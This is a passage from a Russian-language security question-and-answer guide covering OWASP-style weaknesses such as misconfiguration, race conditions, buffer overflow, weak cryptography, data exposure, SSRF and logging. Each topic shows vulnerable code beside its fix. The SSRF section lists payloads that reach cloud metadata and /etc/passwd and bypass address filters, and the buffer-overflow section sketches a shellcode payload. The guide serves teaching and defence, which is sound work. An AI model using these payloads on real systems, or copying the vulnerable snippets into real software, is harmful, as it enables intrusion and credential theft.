- Использование безопасных форматов (JSON вместо pickle)
- Валидация перед десериализацией
- Whitelist разрешённых классов
- Изоляция процесса десериализации
- Использование цифровых подписей

---

### 144. Какие уязвимости связаны с неправильной конфигурацией (Security Misconfiguration)?

**Ответ:** Уязвимости, связанные с **Security Misconfiguration** (небезопасной конфигурацией):

**1. Отладочные интерфейсы в production:**
- Включённый debug mode
- Отладочные порты открыты
- Консоли разработчика доступны

**2. Небезопасная конфигурация сервера:**
- Отсутствие HTTPS
- Слабые алгоритмы шифрования
- Отсутствие security headers

**3. Раскрытие информации:**
- Версии в HTTP заголовках
- Стек технологий в заголовках
- Детальные сообщения об ошибках

**4. Небезопасные права доступа:**
- Файлы с правами 777
- Неправильные права на директории
- Чувствительные файлы доступны всем

**5. Небезопасная конфигурация базы данных:**
- Учётные записи по умолчанию
- Слабые пароли
- Публичный доступ к БД

**6. Небезопасная конфигурация облачных сервисов:**
- Публичные S3 buckets
- Открытые порты в Security Groups
- Неправильные IAM политики

**7. Отсутствие обновлений:**
- Устаревшие зависимости
- Отсутствие security patches
- Использование EOL версий

**8. Небезопасная конфигурация веб-сервера:**
- Отсутствие WAF
- Неправильная конфигурация CORS
- Отсутствие rate limiting

**Примеры:**

```python
# УЯЗВИМО: Debug mode в production
app.run(debug=True, host='0.0.0.0')

# БЕЗОПАСНО
app.run(debug=False, host='127.0.0.1')
```

```nginx
# УЯЗВИМО: Раскрытие версий
server {
    server_tokens on;  # Раскрывает версию Nginx
}

# БЕЗОПАСНО
server {
    server_tokens off;  # Скрывает версию
}
```

**Категория OWASP Top 10:**
- **A05:2021 – Security Misconfiguration**

**Меры защиты:**
- Автоматизированные проверки конфигурации
- Безопасные конфигурации по умолчанию
- Регулярные аудиты конфигурации
- Минимализация конфигурации
- Документирование конфигурации

---

### 145. Что такое race condition и как она возникает?

**Ответ:** **Race Condition (CWE-362)** — это уязвимость, при которой результат выполнения программы зависит от относительного порядка выполнения операций, выполняемых параллельно или в определённой последовательности.

**Как возникает:**

Race condition возникает, когда:
1. Два или более потока/процесса обращаются к одному ресурсу
2. Операции не атомарны (не выполняются как одно целое)
3. Результат зависит от порядка выполнения

**Типы race conditions:**

**1. Time-of-check-time-of-use (TOCTOU):**
```python
# УЯЗВИМО
if os.path.exists(filename):
    # Между проверкой и использованием файл может быть изменён
    time.sleep(1)  # Симуляция задержки
    with open(filename, 'r') as f:  # Файл может быть удалён или изменён
        content = f.read()
```

**2. Check-then-act:**
```python
# УЯЗВИМО: Проверка баланса и снятие
balance = account.get_balance()
if balance >= amount:
    time.sleep(1)  # Другой поток может изменить баланс
    account.withdraw(amount)  # Может снять больше, чем есть
```

**3. File-based race condition:**
```python
# УЯЗВИМО: Создание временного файла
temp_file = f"/tmp/{user_id}.tmp"
if not os.path.exists(temp_file):
    # Между проверкой и созданием другой процесс может создать файл
    with open(temp_file, 'w') as f:
        f.write(data)
```

**Примеры уязвимостей:**

**1. Authentication bypass:**
```python
# УЯЗВИМО
if not user.is_locked():
    attempts = user.login_attempts
    attempts += 1
    user.login_attempts = attempts
    if attempts > 5:
        user.lock()
    # Между проверкой и блокировкой другой запрос может пройти
```

**2. File upload race:**
```python
# УЯЗВИМО
if not os.path.exists(filename):
    # Файл может быть создан другим процессом
    with open(filename, 'w') as f:
        f.write(user_content)
```

**Защита:**

**1. Синхронизация (Locks):**
```python
import threading

lock = threading.Lock()

def safe_operation():
    with lock:
        # Критическая секция
        balance = account.get_balance()
        if balance >= amount:
            account.withdraw(amount)
```

**2. Атомарные операции:**
```python
# БЕЗОПАСНО: Атомарное обновление
account.withdraw_atomic(amount)  # Проверка и снятие в одной операции
```

**3. Транзакции:**
```python
# БЕЗОПАСНО: Использование транзакций БД
with db.transaction():
    balance = account.get_balance()
    if balance >= amount:
        account.withdraw(amount)
```

**4. Идемпотентность:**
```python
# БЕЗОПАСНО: Идемпотентные операции
result = operation()  # Безопасно повторять
```

---

### 146. Что такое buffer overflow и к какому классу ошибок он относится?

**Ответ:** **Buffer Overflow (CWE-120, CWE-121)** — это уязвимость, при которой программа записывает данные за пределы выделенного буфера памяти, что может привести к перезаписи соседней памяти и выполнению произвольного кода.

**Класс ошибок:**
Buffer Overflow относится к категории **Memory Safety** и **Out-of-bounds Write**.

**CWE классификация:**
- **CWE-120** — Buffer Copy without Checking Size of Input
- **CWE-121** — Stack-based Buffer Overflow
- **CWE-122** — Heap-based Buffer Overflow
- **CWE-124** — Buffer Underwrite

**Типы:**

**1. Stack-based Buffer Overflow:**
```c
// УЯЗВИМО
void vulnerable_function(char *input) {
    char buffer[256];
    strcpy(buffer, input);  // Нет проверки размера
    // Если input длиннее 256, перезапишет стек
}
```

**2. Heap-based Buffer Overflow:**
```c
// УЯЗВИМО
char *buffer = malloc(256);
strcpy(buffer, large_input);  // Перезапись heap
```

**3. Integer Overflow:**
```c
// УЯЗВИМО
int size = length1 + length2;  // Может переполниться
char *buffer = malloc(size);
```

**Последствия:**
- Выполнение произвольного кода
- Обход механизмов безопасности
- DoS (отказ в обслуживании)
- Изменение поведения программы

**Примеры атак:**

```c
// Классическая атака через переполнение стека
char payload[300];
memset(payload, 'A', 256);  // Заполнение буфера
strcat(payload, "\x41\x41\x41\x41");  // Перезапись return address
strcat(payload, shellcode);  // Код для выполнения
vulnerable_function(payload);
```

**Защита:**

**1. Использование безопасных функций:**
```c
// БЕЗОПАСНО
char buffer[256];
strncpy(buffer, input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

**2. Проверка размера:**
```c
// БЕЗОПАСНО
if (strlen(input) >= sizeof(buffer)) {
    return ERROR_TOO_LONG;
}
strcpy(buffer, input);
```

**3. Защитные механизмы компилятора:**
- Stack canaries
- ASLR (Address Space Layout Randomization)
- DEP/NX (Data Execution Prevention)
- Stack Guard

**4. Языки с безопасностью памяти:**
- Python, Java, Rust — автоматическая проверка границ
- Управление памятью компилятором/интерпретатором

---

### 147. Какие уязвимости связаны с использованием небезопасных криптографических алгоритмов?

**Ответ:** Уязвимости, связанные с небезопасными криптографическими алгоритмами:

**1. Использование устаревших алгоритмов:**
- **MD5** — устарел, небезопасен
- **SHA-1** — устарел, найден collision
- **DES** — слишком короткий ключ (56 бит)
- **RC4** — небезопасен для использования

**2. Слабые алгоритмы шифрования:**
- **3DES** — устарел
- **Blowfish** — короткий блок (64 бит)
- **IDEA** — устарел

**3. Небезопасные режимы шифрования:**
- **ECB (Electronic Codebook)** — небезопасен, одинаковые блоки дают одинаковый шифротекст
- **CBC без проверки целостности** — уязвим к padding oracle attacks

**4. Слабые ключи:**
- Короткие ключи (< 128 бит для симметричных)
- Предсказуемые ключи
- Хардкод ключей в коде

**5. Небезопасная генерация случайных чисел:**
- Использование rand() вместо криптографически стойких генераторов
- Предсказуемые seed
- Недостаточная энтропия

**6. Небезопасное хеширование паролей:**
- MD5, SHA-1 для паролей
- Отсутствие salt
- Недостаточное количество итераций

**7. Небезопасные протоколы:**
- SSL 2.0/3.0 — устарели
- TLS 1.0/1.1 — устарели (рекомендуется TLS 1.2+)
- Небезопасные cipher suites

**Примеры:**

```python
# УЯЗВИМО: Использование MD5
import hashlib
hash = hashlib.md5(password).hexdigest()  # Небезопасно!

# БЕЗОПАСНО: Использование bcrypt
import bcrypt
hash = bcrypt.hashpw(password, bcrypt.gensalt())

# УЯЗВИМО: Слабый ключ
key = "secret123"  # Слишком короткий и простой

# БЕЗОПАСНО: Генерация ключа
import secrets
key = secrets.token_bytes(32)  # 256 бит
```

**CWE классификация:**
- **CWE-327** — Use of a Broken or Risky Cryptographic Algorithm
- **CWE-326** — Inadequate Encryption Strength
- **CWE-330** — Use of Insufficiently Random Values

**Меры защиты:**
- Использование современных алгоритмов (AES-256, SHA-256/512)
- Использование проверенных библиотек
- Регулярное обновление криптографических библиотек
- Проверка соответствия стандартам (FIPS, Common Criteria)

---

### 148. Какие уязвимости относятся к категории «Sensitive Data Exposure»?

**Ответ:** Уязвимости категории **Sensitive Data Exposure (Раскрытие чувствительных данных):**

**1. Нешифрованные данные:**
- Хранение паролей в открытом виде
- Передача данных по HTTP вместо HTTPS
- Нешифрованные базы данных

**2. Слабое шифрование:**
- Использование устаревших алгоритмов
- Слабые ключи шифрования
- Небезопасные режимы шифрования

**3. Небезопасное хранение паролей:**
- Хеширование без salt
- Использование MD5/SHA-1 для паролей
- Отсутствие bcrypt/argon2

**4. Раскрытие данных в логах:**
- Логирование паролей
- Логирование токенов
- Логирование кредитных карт

**5. Раскрытие через ответы API:**
- Возврат чувствительных полей
- Детальные сообщения об ошибках
- Отладочная информация в production

**6. Раскрытие в коде:**
- Хардкод секретов в коде
- Коммиты секретов в git
- Раскрытие в исходном коде

**7. Раскрытие через резервные копии:**
- Нешифрованные backup файлы
- Публично доступные backup файлы
- Раскрытие структуры БД

**8. Раскрытие через кэш:**
- Кэширование чувствительных данных
- Кэш доступен неавторизованным пользователям
- Кэш в браузере содержит чувствительные данные

**Примеры:**

```python
# УЯЗВИМО: Передача по HTTP
response = requests.post("http://api.example.com/login",  # HTTP!
                        data={"password": password})

# БЕЗОПАСНО: HTTPS
response = requests.post("https://api.example.com/login",
                        data={"password": password})

# УЯЗВИМО: Логирование паролей
logger.info(f"User {username} logged in with password {password}")

# БЕЗОПАСНО: Не логировать пароли
logger.info(f"User {username} logged in")
```

**Категория OWASP Top 10:**
- **A02:2021 – Cryptographic Failures** (ранее Sensitive Data Exposure)

**Меры защиты:**
- Шифрование данных в покое и при передаче
- Использование сильных алгоритмов шифрования
- Безопасное хеширование паролей
- Маскирование чувствительных данных
- Регулярные аудиты данных

---

### 149. Что такое SSRF и как её предотвратить?

**Ответ:** **SSRF (Server-Side Request Forgery, CWE-918)** — это уязвимость, при которой сервер выполняет HTTP-запросы к произвольным URL, указанным злоумышленником, что позволяет получать доступ к внутренним ресурсам или выполнять запросы от имени сервера.

**Как работает:**

1. Приложение получает URL от пользователя
2. Приложение выполняет запрос к этому URL
3. Злоумышленник указывает внутренний URL или URL к внешнему ресурсу
4. Сервер выполняет запрос, раскрывая внутреннюю сеть

**Типы SSRF:**

**1. Basic SSRF:**
```python
# УЯЗВИМО
url = request.args.get('url')
response = requests.get(url)  # Может запросить внутренние ресурсы
```

**2. Blind SSRF:**
- Результат не возвращается пользователю
- Обнаружение через timing или DNS
- Использование для сканирования сети

**Примеры атак:**

```
# Доступ к внутренним ресурсам
?url=http://localhost/admin
?url=http://127.0.0.1:8080/internal-api
?url=http://169.254.169.254/latest/meta-data/  # AWS metadata

# Обход фильтров
?url=http://127.0.0.1 → ?url=http://127.1 (IPv4 сокращение)
?url=http://localhost → ?url=http://[::1] (IPv6)
?url=http://localhost → ?url=http://0177.0.0.1 (восьмеричная)

# Использование разных протоколов
?url=file:///etc/passwd
?url=gopher://internal-server:8080
?url=dns://internal-server
```

**Последствия:**
- Доступ к внутренним сервисам
- Чтение локальных файлов
- Обход firewall
- Получение cloud metadata (credentials)

**Защита:**

**1. Whitelist разрешённых доменов:**
```python
ALLOWED_DOMAINS = ['api.example.com', 'trusted-service.com']

def safe_request(url):
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    # Дополнительные проверки
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Scheme not allowed")
    
    return requests.get(url)
```

**2. Блокировка внутренних адресов:**
```python
import ipaddress

PRIVATE_NETWORKS = [
    ipaddress.IPv4Network('127.0.0.0/8'),
    ipaddress.IPv4Network('10.0.0.0/8'),
    ipaddress.IPv4Network('172.16.0.0/12'),
    ipaddress.IPv4Network('192.168.0.0/16'),
]

def is_internal(host):
    try:
        ip = ipaddress.ip_address(host)
        for network in PRIVATE_NETWORKS:
            if ip in network:
                return True
    except:
        pass
    return host in ['localhost', '0.0.0.0']

def safe_request(url):
    parsed = urlparse(url)
    if is_internal(parsed.hostname):
        raise ValueError("Internal addresses not allowed")
    
    return requests.get(url)
```

**3. Использование разрешённых протоколов:**
```python
ALLOWED_SCHEMES = ['http', 'https']

def safe_request(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError("Scheme not allowed")
    
    return requests.get(url)
```

**4. Использование DNS-резолвинга:**
```python
import socket

def resolve_host(hostname):
    # Резолв DNS перед запросом
    ip = socket.gethostbyname(hostname)
    if is_internal(ip):
        raise ValueError("Resolved to internal IP")
    return ip
```

**Дополнительные меры:**
- Использование ID вместо URL для внутренних запросов
- Изоляция сетевых запросов
- Мониторинг исходящих запросов
- Ограничение redirects

---

### 150. Какие категории OWASP Top 10 (2021) связаны с недостаточным логированием?

**Ответ:** Недостаточное логирование и мониторинг относится к категории **A09:2021 – Security Logging and Monitoring Failures** в OWASP Top 10 (2021).

**Описание категории:**
Эта категория включает недостатки в логировании и мониторинге безопасности, которые затрудняют обнаружение, реагирование и восстановление после инцидентов безопасности.

**Типичные проблемы:**

**1. Отсутствие логирования:**
- Критичные события не логируются
- Отсутствие логирования аутентификации
- Отсутствие логирования доступа к данным

**2. Недостаточное логирование:**
- Логирование только успешных операций
- Отсутствие логирования неудачных попыток
- Недостаточный уровень детализации

**3. Небезопасное логирование:**
- Логирование чувствительных данных (пароли, токены)
- Логи хранятся в незащищённом виде
- Логи доступны неавторизованным пользователям

**4. Недостаточный мониторинг:**
- Отсутствие мониторинга безопасности
- Нет алертов при подозрительной активности
- Отсутствие SIEM-систем

**5. Недостаточное время хранения:**
- Короткое время хранения логов
- Логи удаляются слишком быстро
- Отсутствие архивов логов

**Примеры:**

```python
# УЯЗВИМО: Отсутствие логирования
def login(username, password):
    user = authenticate(username, password)
    if user:
        create_session(user)
    # Нет логирования успешных/неудачных входов

# БЕЗОПАСНО: Логирование
def login(username, password):
    user = authenticate(username, password)
    if user:
        logger.info(f"Successful login: {username} from {request.remote_addr}")
        create_session(user)
    else:
        logger.warning(f"Failed login attempt: {username} from {request.remote_addr}")
        # Alert если слишком много неудачных попыток
```

**Что нужно логировать:**

1. **События аутентификации:**
   - Успешные входы
   - Неудачные попытки входа
   - Выходы из системы
   - Изменение паролей

2. **События авторизации:**
   - Отказы в доступе
   - Попытки доступа к защищённым ресурсам
   - Изменение прав доступа

3. **События доступа к данным:**
   - Чтение чувствительных данных
   - Изменение данных
   - Экспорт данных

4. **Административные действия:**
   - Изменение конфигурации
   - Управление пользователями
   - Изменение политик безопасности

5. **Подозрительная активность:**
   - Множественные неудачные попытки
   - Необычные паттерны доступа
   - Попытки SQL injection, XSS и т.д.

**Меры защиты:**

1. **Комплексное логирование:**
   - Логирование всех критичных событий
   - Использование структурированного логирования
   - Корреляция событий

2. **Безопасное хранение:**
   - Шифрование логов
   - Защита доступа к логам
   - Резервное копирование

3. **Мониторинг:**
   - SIEM-системы
   - Автоматические алерты
   - Дашборды безопасности

4. **Анализ:**
   - Регулярный анализ логов
   - Обнаружение аномалий
   - Инцидент-менеджмент

**Пример безопасного логирования:**

```python
import logging
import json
from datetime import datetime

class SecureLogger:
    def log_security_event(self, event_type, details):
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'event_type': event_type,
            'user': getattr(request, 'user', 'anonymous'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'details': self.sanitize_details(details)
        }
        logging.info(json.dumps(log_entry))
    
    def sanitize_details(self, details):
        # Удаление чувствительных данных
        sensitive_fields = ['password', 'token', 'credit_card']
        sanitized = details.copy()
        for field in sensitive_fields:
            if field in sanitized:
                sanitized[field] = '***REDACTED***'
        return sanitized

# Использование
logger = SecureLogger()
logger.log_security_event('login_success', {'username': 'user123'})
logger.log_security_event('access_denied', {'resource': '/admin/users'})
```

**Статистика OWASP:**
- Средний взвешенный показатель влияния: 6.9/10
- Встречается в 90% протестированных приложений
- Затрудняет обнаружение и реагирование на атаки

---

## Источники:
- OWASP Top 10 (2021)
- CWE (Common Weakness Enumeration)
- CVE (Common Vulnerabilities and Exposures)
- CVSS (Common Vulnerability Scoring System)
- OWASP Testing Guide
- NIST Vulnerability Database


